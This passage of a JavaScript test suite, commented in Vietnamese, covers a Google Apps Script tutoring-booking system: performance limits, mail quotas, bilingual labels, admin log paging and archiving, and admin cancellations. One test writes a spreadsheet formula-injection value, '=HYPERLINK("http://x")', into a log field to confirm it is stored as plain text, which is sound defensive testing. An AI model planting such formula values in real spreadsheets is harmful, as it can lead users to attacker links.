  SA.flush = function () { if (!failed && api.table_('MAIL_LOG').all().some(m => m.kind === 'MKT:LOGG')) { failed++; throw new Error('Service Spreadsheets timed out (giả lập)'); } return realFlush.apply(SA, arguments); };
  let rg; try { rg = api.marketingSend_('LOGG', 'test'); } finally { SA.flush = realFlush; }
  assert.ok(failed === 1, 'lỗi giả lập đã xảy ra');
  const lg = mktMails(c, 'LOGG').map(m => m.to);
  assert.strictEqual(lg.length, rg.sent, 'không ghi đôi: ' + lg.length + ' dòng cho ' + rg.sent + ' email');
  // Tắt mẫu chân: vẫn có câu từ chối nhận
  setTpl(c, 'MARKETING_FOOTER', { active: false }); api.refreshContent_();
  mkt(c, { campaign_id: 'FOOT', status: 'READY', audience: 'TUTORS', subject_vi: 'A', body_vi: 'Chào {{name}}', subject_en: 'A', body_en: 'Hi {{name}}' });
  api.marketingSend_('FOOT', 'test');
  const fm = c.mailsTo(EMAIL.T002).slice(-1)[0];
  assert.ok(/ngừng gửi/.test(fm.htmlBody) && /we will stop/.test(fm.htmlBody), 'chân từ chối nhận luôn có');
  mkt(c, { campaign_id: 'BTN', status: 'READY', audience: 'TUTORS', subject_vi: 'A', body_vi: '{{button:name|Bấm}}' });
  assert.ok(/phải dùng biến link/.test(api.marketingCheck_(api.marketingRow_('BTN'), false).errors.join()));
});

// ═══ Chunk 5I: tốc độ, email, song ngữ trang quản trị, nhật ký ═══

t('I103', 'Tốc độ (5I): một lượt đặt mở file DB tối đa 3 lần (mở lại khi vào khoá), đọc ENV và DB_ID tối đa 2 lần; ghi nhật ký và MAIL_LOG không đọc cả tab (20.000 dòng nhật ký không làm lượt đặt đọc thêm); dòng nhật ký vẫn đủ và đúng thứ tự', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const big = []; for (let i = 0; i < 20000; i++) big.push({ time: new Date(2026, 9, 1, 8, 0, i % 60), actor: 'SYSTEM', action: 'CALENDAR_QUEUE', entity: 'BOOKINGS', entity_id: '', detail: 'x' + i });
  c.putRows('ACTIVITY_LOG', big); c.putRows('MAIL_LOG', big.map(b => ({ time: b.time, to: 'a@b.test', subject: 's', kind: 'K' })));
  const tok = tokenFor(c, 'S001');
  const SA = env.globals.SpreadsheetApp, PS = env.globals.PropertiesService.getScriptProperties();
  const realOpen = SA.openById, realGet = PS.getProperty; let opens = 0, props = 0;
  SA.openById = function () { opens++; return realOpen.apply(SA, arguments); };
  PS.getProperty = function (k) { if (k === 'ENV' || /^DB_ID_/.test(k)) props++; return realGet.apply(PS, arguments); };
  api.clearDbCache_(); api.clearConfigCache_(); env.state.cellsRead = 0;
  let r; try { r = api.apiStudentBook(tok, [{ date: '2026-10-14', slot: '19:00' }], 'rid-5i'); } finally { SA.openById = realOpen; PS.getProperty = realGet; }
  assert.ok(r.ok && r.data[0].ok, JSON.stringify(r));
  assert.ok(opens <= 3, 'mở file DB ' + opens + ' lần (trước 5I: 4; mỗi lần vào khoá ngoài cùng mở lại, soát 5I A5)');
  assert.ok(props <= 2, 'đọc ENV, DB_ID ' + props + ' lần');
  assert.ok(env.state.cellsRead < 60000, 'đọc ' + env.state.cellsRead + ' ô: không được đọc cả 20.000 dòng nhật ký (120.000 ô)');
  const log = c.rows('ACTIVITY_LOG');
  assert.strictEqual(log.length >= 20001, true);
  assert.strictEqual(log[log.length - 1].action !== 'CALENDAR_QUEUE' || log.some(l => l.action === 'BOOKED'), true);
  assert.ok(log.slice(20000).some(l => l.action === 'BOOKED' && l.actor === EMAIL.S001), 'dòng BOOKED ghi ở cuối tab');
  assert.ok(c.rows('MAIL_LOG').slice(20000).length >= 2, 'MAIL_LOG ghi thêm ở cuối');
  // Trong cùng một khoá: ghi rồi đọc lại tab thấy ngay dòng vừa ghi
  api.withLock_(() => { api.logActivity_('SYSTEM', 'SPEED_TEST', 'SYSTEM', '', 'a'); assert.ok(api.table_('ACTIVITY_LOG').all().slice(-1)[0].detail === 'a', 'đọc trong khoá thấy dòng chờ ghi'); api.logActivity_('SYSTEM', 'SPEED_TEST', 'SYSTEM', '', 'b'); });
  const tail = c.rows('ACTIVITY_LOG').slice(-2).map(l => l.detail);
  assert.deepStrictEqual(tail, ['a', 'b'], 'thứ tự giữ nguyên');
  // Tab đã đọc trong khoá rồi mới ghi: đọc lại ngay vẫn thấy dòng mới (ghi qua bảng đã nạp)
  api.withLock_(() => { const n0 = api.table_('ACTIVITY_LOG').all().length; api.logActivity_('SYSTEM', 'SPEED_TEST', 'SYSTEM', '', 'z'); assert.strictEqual(api.table_('ACTIVITY_LOG').all().length, n0 + 1, 'bảng đã nạp thấy dòng vừa ghi'); });
  assert.strictEqual(c.rows('ACTIVITY_LOG').slice(-1)[0].detail, 'z');
  // Ngoài khoá, ngoài lượt API: lấy khoá ngắn và ghi ngay
  api.logActivity_('SYSTEM', 'SPEED_TEST', 'SYSTEM', '', 'c');
  assert.strictEqual(c.rows('ACTIVITY_LOG').slice(-1)[0].detail, 'c');
  // Chữ bắt đầu bằng = trong chi tiết không thành công thức (cột detail là cột chữ)
  api.logActivity_('x@y.test', 'PROFILE_UPDATED', 'USER', 'S001', '=HYPERLINK("http://x")');
  assert.strictEqual(c.rawCell('ACTIVITY_LOG', c.rows('ACTIVITY_LOG').slice(-1)[0]._row, 'detail'), '=HYPERLINK("http://x")');
  assert.strictEqual(env.state.spreadsheets['DB_STAGING_TEST'].sheets.ACTIVITY_LOG.formats[c.rows('ACTIVITY_LOG').slice(-1)[0]._row + ':' + (api.SCHEMA.ACTIVITY_LOG.cols.indexOf('detail') + 1)], '@', 'ô chi tiết định dạng chữ');
});

t('I104', 'Email (5I): hạn mức 100 trên Workspace được giải thích là mức dùng thử; Gmail thường; MARKETING_QUOTA_RESERVE không nhỏ hơn hạn mức thì báo trước; menu Kiểm tra gửi email gửi thư có mã, ghi nhật ký, báo hạn mức trước và sau; địa chỉ sai không gửi', () => {
  const c = mk(), { api, env } = c;
  const w = api.mailQuotaInfo_(97, 3, 'admin@thaiput.vn');
  assert.strictEqual(w.kind, 'WORKSPACE_LIMITED'); assert.strictEqual(w.limit, 100);
  assert.ok(w.warnings.some(x => /dùng thử/.test(x) && /100 USD/.test(x) && /60 ngày/.test(x)), w.warnings.join('|'));
  assert.ok(w.warnings.some(x => /marketing sẽ không gửi được/.test(x)), 'MARKETING_QUOTA_RESERVE 100 = hạn mức 100');
  assert.strictEqual(api.mailQuotaInfo_(1400, 100, 'admin@thaiput.vn').kind, 'WORKSPACE');
  assert.ok(!api.mailQuotaInfo_(1400, 100, 'admin@thaiput.vn').warnings.length);
  assert.strictEqual(api.mailQuotaInfo_(90, 10, 'me@gmail.com').kind, 'GMAIL');
  env.state.mailQuota = 100;
  // Vòng 2 N6: đang giả lập giờ (MAIL_LOG ghi giờ giả lập) thì không ước tính, không kết luận sai
  assert.strictEqual(api.mailSentToday_(), null);
  const tsSim = api.testSystem();
  assert.ok(tsSim.lines.some(l => /không ước tính được/.test(l)) && !tsSim.warnings.some(x => /dùng thử/.test(x)), tsSim.lines.join('\n'));
  assert.strictEqual(api.mailQuotaInfo_(97, null, 'admin@thaiput.vn').kind, 'UNKNOWN');
  api.clearSimNow_();
  const ts = api.testSystem();
  assert.ok(ts.lines.some(l => /Email còn gửi được hôm nay: \d+ người nhận/.test(l) && /hạn mức ước tính 100/.test(l)), ts.lines.join('\n'));
  assert.ok(ts.warnings.some(x => /dùng thử/.test(x)));
  const before = env.state.mails.length;
  const r = api.mailTest_('friend@gmail.com', 'admin.karn@gmail.com');
  assert.ok(r.ok && /^MT\d{8}$/.test(r.code) && r.before - r.after === 1, JSON.stringify(r));
  const m = env.state.mails[before];
  assert.strictEqual(m.to, 'friend@gmail.com'); assert.ok(m.subject.indexOf(r.code) !== -1 && /Kiểm tra gửi email/.test(m.subject) && /email test/.test(m.subject), m.subject);
  assert.ok(m.htmlBody.indexOf(r.code) !== -1 && m.htmlBody.indexOf(r.sender) !== -1);
  const lg = c.rows('ACTIVITY_LOG').filter(l => l.action === 'MAIL_TEST').pop();
  assert.ok(lg && lg.entity_id === 'friend@gmail.com' && JSON.parse(lg.detail).code === r.code && JSON.parse(lg.detail).ok === true && /→/.test(JSON.parse(lg.detail).quota), lg && lg.detail);
  // Soát 5I A4: đếm 24 giờ trượt, bỏ địa chỉ thử tải (không gửi thật)
  c.putRows('MAIL_LOG', [{ time: new Date(Date.now() - 2 * 3600e3), to: 'x1@loadtest.invalid', subject: 's', kind: 'K' }, { time: new Date(Date.now() - 20 * 3600e3), to: 'a@b.test', subject: 's', kind: 'K' }, { time: new Date(Date.now() - 30 * 3600e3), to: 'old@b.test', subject: 's', kind: 'K' }]);
  api.clearDbCache_();
  const s24 = api.mailSentToday_(), mlog = c.rows('MAIL_LOG').filter(x => Date.now() - new Date(x.time).getTime() < 24 * 3600e3 && !/loadtest\.invalid/.test(x.to)).length;
  assert.strictEqual(s24, mlog, '24 giờ trượt, bỏ địa chỉ thử tải');
  assert.ok(c.rows('MAIL_LOG').some(x => x.kind === 'MAIL_TEST'));
  const bad = api.mailTest_('khong-phai-email', 'a');
  assert.ok(!bad.ok && /không hợp lệ/.test(bad.error)); assert.strictEqual(env.state.mails.length, before + 1);
  const self = api.mailTest_('', 'a');
  assert.strictEqual(self.to, env.state.effectiveUserEmail, 'để trống: gửi tới tài khoản đang chạy');
  // Vòng 2 N5: mẫu MAIL_TEST tắt thì báo đúng nguyên nhân, không gửi
  api.withLock_(() => { const t = api.table_('EMAIL_TEMPLATES'), r0 = t.all().find(x => String(x.key) === 'MAIL_TEST'); if (r0) t.update(r0, { active: false }); else t.insert({ key: 'MAIL_TEST', audience: 'ALL', active: false }); });
  api.clearDbCache_(); api.clearContentCache_();
  const off = api.mailTest_('friend@gmail.com', 'a');
  assert.ok(!off.ok && /MAIL_TEST đang tắt/.test(off.error), JSON.stringify(off));
  // Khoá bận lúc ghi nhật ký: thư đã gửi vẫn báo kết quả, nhật ký vào hàng chờ
  api.withLock_(() => { const t = api.table_('EMAIL_TEMPLATES'), r0 = t.all().find(x => String(x.key) === 'MAIL_TEST'); if (r0) t.update(r0, { active: true }); });
  api.clearDbCache_(); api.clearContentCache_();
  // Menu có trong thanh menu và có kiểm quyền
  assert.ok(/menuMailTest/.test(api.onOpen.toString()));
  assert.throws(() => { env.state.activeUserEmail = 'stranger@x.test'; api.menuMailTest(); }, /quyền/);
});

t('I105', 'Song ngữ (5I): tên gói tiếng Anh (cột name_en, menu 1 điền cho gói mặc định chưa đổi tên, gói đã đổi tên để trống); email dùng tên gói tiếng Anh ở nửa tiếng Anh; mọi thông báo có nội dung tiếng Anh; email ADMIN_NOTICE đủ tiếng Anh (mẫu cũ còn chữ gốc được cập nhật, mẫu đã sửa giữ nguyên); chữ trang quản trị không gửi cho trang công khai', () => {
  const { api, env } = freshEnv();
  api.setupFirstRun();
  api.clearDbCache_();
  const pk = api.table_('PACKAGES').all();
  assert.strictEqual(pk.find(p => p.code === 'PASS_1M').name_en, '1 month pass');
  // Bản cũ chưa có cột name_en: admin đã đổi tên gói 2 tuần
  api.withLock_(() => { const t = api.table_('PACKAGES'); t.update(t.byId('PASS_2W'), { name: 'Gói 14 ngày', name_en: '' }); t.update(t.byId('TRIAL'), { name_en: '' }); });
  api.setupFirstRun(); api.clearDbCache_();
  assert.strictEqual(api.table_('PACKAGES').byId('TRIAL').name_en, 'Trial, 2 lessons', 'gói chưa đổi tên: điền lại');
  assert.strictEqual(api.table_('PACKAGES').byId('PASS_2W').name_en, '', 'gói đã đổi tên: để admin tự điền');
  assert.strictEqual(api.pkgDefs_().PASS_2W.name_en, 'Gói 14 ngày', 'trống thì dùng tên tiếng Việt');
  // Mẫu ADMIN_NOTICE còn chữ gốc cũ thì cập nhật; đã sửa thì giữ
  api.withLock_(() => { const t = api.table_('EMAIL_TEMPLATES'), r = t.byId('ADMIN_NOTICE'); t.update(r, { subject_en: '[{{tag}}] {{event}}', body_en: 'Event {{event}} at {{time}}. Details are in Vietnamese above and in the NOTIFICATIONS tab.' }); });
  const r1 = api.setupFirstRun(); api.clearDbCache_();
  assert.ok(r1.lines.some(l => /mẫu email còn chữ gốc cũ/.test(l)), r1.lines.join('\n'));
  assert.strictEqual(api.table_('EMAIL_TEMPLATES').byId('ADMIN_NOTICE').subject_en, '[{{tag}}] {{message}}');
  api.withLock_(() => { const t = api.table_('EMAIL_TEMPLATES'); t.update(t.byId('ADMIN_NOTICE'), { body_en: 'Tự viết {{message}}' }); });
  api.setupFirstRun(); api.clearDbCache_();
  assert.strictEqual(api.table_('EMAIL_TEMPLATES').byId('ADMIN_NOTICE').body_en, 'Tự viết {{message}}', 'mẫu admin đã sửa giữ nguyên');
  // Thông báo song ngữ
  const c = mk(), a = c.book('S003', [['2026-10-14', '19:00']])[0];
  c.api.cancelBookingFor_('S003', a.bookingId, EMAIL.S003);
  const ns = c.rows('NOTIFICATIONS');
  const booked = ns.find(n => n.event === 'BOOKED'), canc = ns.find(n => n.event === 'STUDENT_CANCELLED');
  assert.ok(/đặt 1 buổi/.test(booked.message) && /booked 1 lesson/.test(booked.message_en), booked.message_en);
  assert.ok(/huỷ buổi/.test(canc.message) && /cancelled Wed 14\/10 19:00/.test(canc.message_en), canc.message_en);
  const mail = c.env.state.mails.filter(m => /STUDENT_CANCELLED|Học viên huỷ|huỷ buổi/.test(m.subject) && m.to === c.api.adminEmails_()[0]).pop();
  assert.ok(mail && mail.htmlBody.indexOf('cancelled Wed 14/10') !== -1 && mail.htmlBody.indexOf('Details are in Vietnamese') === -1, 'email admin có câu tiếng Anh: ' + (mail && mail.subject));
  // Mọi nơi gọi notify_ đều có message_en (quét mã nguồn)
  const fs = require('fs'), path = require('path'), src = path.join(__dirname, '..', 'src');
  fs.readdirSync(src).filter(f => f.endsWith('.gs') && f !== 'Notifications.gs').forEach(f => {
    const s = fs.readFileSync(path.join(src, f), 'utf8'), re = /\bnotify_\(/g; let m;
    while ((m = re.exec(s))) { if (/function\s+$/.test(s.substring(m.index - 10, m.index))) continue; const seg = s.substring(m.index, m.index + 1800), end = seg.indexOf('});'); assert.ok(seg.substring(0, end).indexOf('message_en') !== -1, f + ': notify_ ở ký tự ' + m.index + ' thiếu message_en: ' + seg.substring(0, 80)); }
  });
  // Tên gói tiếng Anh trong email chào mừng (nửa tiếng Anh) và ở trang công khai
  const info = c.api.apiPublicInfo();
  assert.ok(info.data.packages.every(p => p.nameEn), 'apiPublicInfo có nameEn');
  // Chữ trang quản trị: không nằm trong trang công khai, có trong apiAdminHome
  const html = c.api.doGet({ parameter: {} }).getContent();
  assert.ok(html.indexOf('ad.kpi.today') === -1 && html.indexOf('a.lang_title') !== -1, 'trang công khai không có chữ ad.*');
  const atok = tokenFor(c, 'A01'), home = c.api.apiAdminHome(atok);
  assert.ok(home.ok && home.data.content['ad.kpi.today'][1] === 'Lessons today' && !home.data.content['a.lang_title']);
  assert.ok(home.data.feed.items.every(n => !n.read) && home.data.feedQuery.unread === true, 'thông báo gửi kèm là bộ lọc đầu tiên: chưa đọc');
});

t('I106', 'Nhãn song ngữ đủ (5I): mọi hành động ghi nhật ký, mọi sự kiện thông báo, mọi trạng thái buổi, gói, tài khoản đều có tên tiếng Việt và tiếng Anh; mọi chữ ad.* trang quản trị dùng đều có trong DEFAULT_CONTENT_, đủ 4 phần', () => {
  const { api } = load();
  const fs = require('fs'), path = require('path'), src = path.join(__dirname, '..', 'src');
  const d = api.contentDefaults_();
  const all = fs.readdirSync(src).filter(f => f.endsWith('.gs')).map(f => fs.readFileSync(path.join(src, f), 'utf8')).join('\n');
  // Tham số thứ 2 (hành động) của mỗi lần gọi logActivity_ và logMenu_: tách tham số theo dấu phẩy ngoài ngoặc và ngoài chuỗi.
  const secondArg = (s, i) => { let depth = 0, q = null, n = 0, start = i, out = ''; for (; i < s.length; i++) { const ch = s[i];
    if (q) { if (ch === '\\') { i++; continue; } if (ch === q) q = null; if (n === 1) out += ch; continue; }
    if (ch === "'" || ch === '"') { q = ch; if (n === 1) out += ch; continue; }
    if (ch === '(' || ch === '[' || ch === '{') depth++; else if (ch === ')' || ch === ']' || ch === '}') { if (depth === 0) break; depth--; }
    else if (ch === ',' && depth === 0) { n++; if (n === 2) break; continue; }
    if (n === 1) out += ch; } return out; };
  const acts = new Set(); let m; const re2 = /(?:logActivity_|logMenu_)\(/g;
  while ((m = re2.exec(all))) { if (/function\s*$/.test(all.substring(m.index - 9, m.index))) continue; (secondArg(all, m.index + m[0].length).match(/'([A-Z][A-Z_0-9]{2,})'/g) || []).forEach(x => acts.add(x.replace(/'/g, ''))); }
  const missing = [];
  acts.forEach(a => { if (/^(PACKAGE|MAINTENANCE)_$/.test(a)) { if (!d['ad.act.' + a]) missing.push(a); return; } if (!d['ad.act.' + a] && !/^(PACKAGE|MAINTENANCE)_/.test(a)) missing.push(a); });
  assert.deepStrictEqual(missing, [], 'hành động thiếu nhãn');
  assert.ok(acts.size >= 70, 'đã quét được ' + acts.size + ' hành động');
  Object.keys(api.DEFAULT_NOTIFY_RULES_).forEach(ev => assert.ok(d['ad.ev.' + ev], 'sự kiện ' + ev));
  Object.keys(api.BOOKING_STATUS).forEach(s => assert.ok(d['ad.st.' + s] && api.BOOKING_STATUS_EN_[s], 'trạng thái ' + s));
  Object.keys(api.PKG_STATUS).forEach(s => assert.ok(d['ad.pkg.' + s], 'gói ' + s));
  Object.keys(api.USER_STATUS).forEach(s => assert.ok(d['ad.us.' + s], 'tài khoản ' + s));
  const ui = fs.readFileSync(path.join(src, 'ui', 'Admin.html'), 'utf8');
  const used = new Set(); (ui.match(/L\('([a-z_.A-Z]+)'/g) || []).forEach(x => used.add('ad.' + x.slice(3, -1)));
  (ui.match(/L\([^()]*\? '([a-z_]+)' : '([a-z_]+)'/g) || []).forEach(x => x.substring(x.lastIndexOf('?')).match(/'([a-z_]+)'/g).forEach(y => used.add('ad.' + y.replace(/'/g, ''))));
  ['kpi.critical', 'kpi.warning', 'kpi.regs', 'kpi.tutor_cancels', 'kpi.today', 'kpi.waiting', 'role.TUTOR', 'role.STUDENT', 'lang.vi', 'lang.en', 'lang.none', 'lv.CRITICAL', 'lv.WARNING', 'lv.INFO', 'st.awaiting'].forEach(k => used.add('ad.' + k));
  const miss = Array.from(used).filter(k => !/\.$/.test(k) && !d[k]);
  assert.deepStrictEqual(miss, [], 'chữ trang quản trị thiếu mặc định');
  Object.keys(d).filter(k => k.indexOf('ad.') === 0).forEach(k => {
    const x = d[k];
    assert.ok(x.vi && x.en && x.position && x.shown_when && x.page, 'key ' + k + ' thiếu phần: ' + JSON.stringify(x));
    assert.deepStrictEqual((x.vi.match(/\{\w+\}/g) || []).sort(), (x.en.match(/\{\w+\}/g) || []).sort(), 'biến {..} hai thứ tiếng phải giống nhau: ' + k);
  });
  assert.strictEqual(d['ad.ev.BOOKED'].page, 'Trang quản trị: tên sự kiện thông báo');
  assert.strictEqual(d['ad.logout'].page, 'Trang quản trị');
});

t('I107', 'Nhật ký admin (5I): chỉ 60 ngày gần nhất; lọc người dùng, hệ thống, chữ; xem thêm theo trang; đọc đủ một dòng (tab bị sắp xếp vẫn tìm đúng); thoát, sửa tay Sheets, menu đều ghi; dòng cũ hơn 60 ngày được lưu trữ mỗi đêm, MAIL_LOG vẫn theo tháng', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const long = 'D'.repeat(400);
  c.putRows('ACTIVITY_LOG', [
    { time: new Date(2026, 7, 12, 9, 0), actor: 'SYSTEM', action: 'CALENDAR_QUEUE', entity: 'BOOKINGS', entity_id: '', detail: 'cũ 61 ngày' },
    { time: new Date(2026, 7, 14, 9, 0), actor: 'SYSTEM', action: 'CALENDAR_QUEUE', entity: 'BOOKINGS', entity_id: '', detail: 'còn trong 60 ngày' },
    { time: new Date(2026, 9, 11, 20, 0), actor: 's001@student.test', action: 'BOOKED', entity: 'BOOKING', entity_id: 'BK000777', detail: long }]);
  for (let i = 0; i < 160; i++) c.putRows('ACTIVITY_LOG', [{ time: new Date(2026, 9, 12, 8, 0, i), actor: 'SYSTEM', action: 'JOB_SLOW', entity: 'JOB', entity_id: 'calendarJob', detail: 'n' + i }]);
  const atok = tokenFor(c, 'A01');
  const all = api.apiAdminLog(atok, { limit: 300 }).data;
  assert.ok(!all.items.some(l => l.detail === 'cũ 61 ngày') && all.items.some(l => l.detail === 'còn trong 60 ngày'), 'chỉ 60 ngày');
  assert.strictEqual(all.days, 60);
  const first = api.apiAdminLog(atok, { limit: 150 }).data;
  assert.strictEqual(first.items.length, 150); assert.ok(first.next && first.next.ts > 0, 'còn dòng: có mốc xem thêm');
  // Soát 5I A9: giữa hai lần bấm, job lưu trữ bỏ dòng đầu tab (hàng dời lên): trang sau vẫn không trùng, không sót
  api.withLock_(() => api.purgeRows_('ACTIVITY_LOG', r => r.detail !== 'cũ 61 ngày'));
  const more = api.apiAdminLog(atok, { limit: 150, cursor: first.next }).data;
  assert.ok(more.items.length > 0 && more.items.every(x => x.ts <= first.next.ts), 'trang sau chỉ có dòng cũ hơn');
  const seen = first.items.map(x => x.ts + '|' + x.action + '|' + x.detail).concat(more.items.map(x => x.ts + '|' + x.action + '|' + x.detail));
  assert.strictEqual(new Set(seen).size, seen.length, 'không trùng sau khi hàng dời');
  assert.strictEqual(seen.length, all.items.length, 'không sót: ' + seen.length + '/' + all.items.length);
  const ppl = api.apiAdminLog(atok, { who: 'people', limit: 300 }).data.items;
  assert.ok(ppl.length >= 1 && ppl.every(l => l.actor.indexOf('@') !== -1 || l.actor === 'ADMIN'));
  assert.ok(api.apiAdminLog(atok, { who: 'system', limit: 300 }).data.items.every(l => l.actor === 'SYSTEM'));
  assert.ok(api.apiAdminLog(atok, { text: 'đặt buổi', acts: ['BOOKED'] }).data.items.some(l => l.action === 'BOOKED'), 'tìm theo nhãn đã dịch (trình duyệt gửi mã khớp)');
  assert.ok(api.apiAdminLog(atok, { text: 'hệ thống', sys: true }).data.items.every(l => l.actor === 'SYSTEM'), 'tìm "Hệ thống"');
  const bk = api.apiAdminLog(atok, { text: 'bk000777' }).data.items[0];
  assert.ok(bk && bk.detail.length === 160 && bk.more === true, 'xem trước cắt 160 ký tự');
  const full = api.apiAdminLogEntry(atok, bk.row, bk.ts, bk.action);
  assert.ok(full.ok && full.data.detail === long && /#gid=/.test(full.data.link), 'đọc đủ chi tiết');
  // Admin sắp xếp tab: số hàng đổi, vẫn tìm đúng theo mốc giờ và hành động
  const sh = env.state.spreadsheets['DB_STAGING_TEST'].sheets.ACTIVITY_LOG; const head = sh.values[0], body = sh.values.slice(1).reverse(); sh.values = [head].concat(body);
  api.clearDbCache_();
  const again = api.apiAdminLogEntry(atok, bk.row, bk.ts, bk.action);
  assert.ok(again.ok && again.data.detail === long && again.data.row !== bk.row, 'tìm lại sau khi sắp xếp');
  assert.strictEqual(api.apiAdminLogEntry(atok, 99999, 1, 'NONE').reason, 'NOT_FOUND');
  assert.strictEqual(api.apiAdminLog(tokenFor(c, 'S001'), {}).reason, 'FORBIDDEN', 'học viên không xem được nhật ký');
  // Thoát ghi LOGOUT
  const st = tokenFor(c, 'S002'); api.apiLogout(st);
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'LOGOUT' && l.entity_id === 'S002'));
  // Sửa tay trong Sheets ghi SHEET_EDIT (giá trị cũ, mới); tab AUTH không ghi giá trị; tab nhật ký không ghi
  const ss = env.state.spreadsheets['DB_STAGING_TEST'], sheetApi = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST');
  const cfgSh = sheetApi.getSheetByName('CONFIG'), vals = ss.sheets.CONFIG.values, ri = 2, ck = vals[1][0];
  env.state.activeUserEmail = env.state.effectiveUserEmail;
  api.onEditInstallable({ range: cfgSh.getRange(ri, 2), value: 'thaiput 2', oldValue: vals[ri - 1][1], triggerUid: env.state.triggers.find(x => x.onEdit) ? env.state.triggers.find(x => x.onEdit).uid : undefined, user: { getEmail: () => 'karn@thaiput.vn' } });
  const se = c.rows('ACTIVITY_LOG').filter(l => l.action === 'SHEET_EDIT').pop();
  assert.ok(se && se.entity === 'CONFIG' && se.entity_id === ck && /^B2 \(value\): ".*" → "thaiput 2"$/.test(se.detail) && se.actor === 'karn@thaiput.vn', JSON.stringify(se));
  assert.ok(/AUTH/.test(api.sheetEditDetail_('AUTH', 'A2', 'token_hash', 'abc', 'def', 1)) || !/abc|def/.test(api.sheetEditDetail_('AUTH', 'A2', 'token_hash', 'abc', 'def', 1)), 'AUTH không ghi giá trị');
  assert.ok(!/abc|def/.test(api.sheetEditDetail_('AUTH', 'A2', 'token_hash', 'abc', 'def', 1)));
  assert.strictEqual(api.sheetEditDetail_('USERS', 'A2:C3', '', '', '', 6), 'A2:C3 ×6');
  assert.strictEqual(api.sheetEditDetail_('USERS', 'A2:B2', '', '', '', 2, [['A2', 'x'], ['B2', 'y']]), 'A2:B2 ×2: A2="x", B2="y"');
  assert.strictEqual(api.sheetEditDetail_('USERS', 'B2', 'name', undefined, 'Vân', 1), 'B2 (name): ? → "Vân"', 'không có giá trị cũ thì ghi ?');
  assert.ok(!/abc|def/.test(api.sheetEditDetail_('AUTH', 'A2:B2', '', '', '', 2, [['A2', 'abc'], ['B2', 'def']])), 'AUTH nhiều ô cũng không ghi giá trị');
  const n0 = c.rows('ACTIVITY_LOG').length;
  const logSh = sheetApi.getSheetByName('ACTIVITY_LOG');
  api.onEditInstallable({ range: logSh.getRange(2, 6), value: 'x', oldValue: 'y', user: { getEmail: () => 'karn@thaiput.vn' } });
  assert.strictEqual(c.rows('ACTIVITY_LOG').length, n0, 'sửa tab nhật ký không tự ghi nhật ký');
  // Lưu trữ: ACTIVITY_LOG theo ngày (60), MAIL_LOG theo tháng
  const cut = api.archiveCutoffs_(api.getNow_());
  assert.strictEqual(api.fmtDate_(cut.activity), '13/08/2026');
  const el = api.archiveEligible_('ACTIVITY_LOG', [{ time: new Date(2026, 7, 12, 23, 0) }, { time: new Date(2026, 7, 13, 0, 1) }], { cut: cut, sps: {} });
  assert.strictEqual(el.length, 1, 'chỉ dòng trước 13/08');
  // 5K: MAIL_LOG cùng mốc 60 ngày, trừ dòng email marketing
  const em = api.archiveEligible_('MAIL_LOG', [{ time: new Date(2026, 7, 12), kind: 'LOGIN_LINK' }, { time: new Date(2026, 7, 12), kind: 'MKT:TET' }, { time: new Date(2026, 7, 14), kind: 'X' }], { cut: cut, sps: {} });
  assert.deepStrictEqual(em.map(x => x.kind), ['LOGIN_LINK'], 'MAIL_LOG 60 ngày, giữ MKT:');
  assert.strictEqual(api.fmtDate_(cut.log), '13/08/2026');
});

t('I108', 'Ô số liệu admin (5I): danh sách buổi hôm nay và chờ tutor xác nhận khớp đúng số trên ô; huỷ lại báo cả hai thứ tiếng; đặt thay bị từ chối có câu hai thứ tiếng; admin đổi ngôn ngữ được lưu', () => {
  const c = mk('2026-10-14 20:10'), { api } = c;
  c.at('2026-10-13 10:00'); c.book('S003', [['2026-10-14', '19:00']]); c.book('S005', [['2026-10-14', '21:00']]); c.at('2026-10-14 20:10');
  const atok = tokenFor(c, 'A01'), h = api.apiAdminHome(atok).data;
  const today = api.apiAdminLessons(atok, 'today').data, wait = api.apiAdminLessons(atok, 'waiting').data;
  assert.strictEqual(today.total, h.counts.lessonsToday); assert.strictEqual(wait.total, h.counts.waitingResult);
  assert.ok(today.items.length === 2 && today.items[0].slot === '19:00' && today.items[0].awaiting === true && today.items[1].canCancel === true, JSON.stringify(today.items));
  assert.ok(wait.items.length === 1 && wait.items[0].status === 'CONFIRMED');
  assert.strictEqual(api.apiAdminLessons(tokenFor(c, 'S003'), 'today').reason, 'FORBIDDEN');
  const b21 = today.items[1];
  assert.ok(api.apiAdminCancel(atok, b21.id, 'Cancelled by admin', 'r1').ok);   // admin dùng EN, để nguyên chữ mặc định
  const again = api.apiAdminCancel(atok, b21.id, 'Lý do', 'r2');
  // Chunk 5M: huỷ lúc 20:10 cho buổi 21:00 cùng ngày là Huỷ muộn.
  assert.ok(/đã được huỷ trước đó \(Huỷ muộn\)/.test(again.msg.vi) && /already cancelled \(Cancelled late\)/.test(again.msg.en), JSON.stringify(again.msg));
  const nb = c.rows('NOTIFICATIONS').filter(x => x.event === 'ADMIN_CANCELLED').pop();
  // Vòng 2 N1: chữ mặc định (tiếng Việt) là không ghi lý do: lưu mã cố định, thông báo tiếng Anh dùng câu tiếng Anh
  assert.ok(nb && /: Cancelled by admin$/.test(nb.message_en) && /: Admin huỷ$/.test(nb.message), nb && nb.message + ' | ' + nb.message_en);
  assert.strictEqual(c.rows('BOOKINGS').find(x => x.booking_id === b21.id).cancel_reason, 'Admin huỷ');
  assert.strictEqual(api.apiAdminBooking(atok, b21.id).data.cancelReasonKey, 'ADMIN');
  const started = api.apiAdminCancel(atok, today.items[0].id, '', 'r3');
  assert.ok(/đã bắt đầu/.test(started.msg.vi) && /has started/.test(started.msg.en));
  const bk = api.apiAdminBook(atok, 'S003', [{ date: '2026-10-14', slot: '22:00' }], 'r4');
  assert.ok(bk.ok && !bk.data[0].ok && bk.data[0].msg.vi && bk.data[0].msg.en && bk.data[0].msg.vi !== bk.data[0].msg.en, JSON.stringify(bk.data[0]));
  // Bảo trì chỉ xem: học viên không lưu được ngôn ngữ, admin luôn lưu được (luật 47)
  api.setMaintMode_('READONLY', 'test');
  assert.strictEqual(api.apiSetLanguage(tokenFor(c, 'S003'), 'en').reason, 'MAINT_READONLY');
  assert.ok(api.apiSetLanguage(atok, 'en').ok, 'admin không bị bảo trì chặn'); api.clearDbCache_();
  api.setMaintMode_('OFF', 'test');
  assert.strictEqual(api.userById_('A01').lang, 'en');
  assert.strictEqual(api.apiAdminHome(atok).data.me.lang, 'en');
});

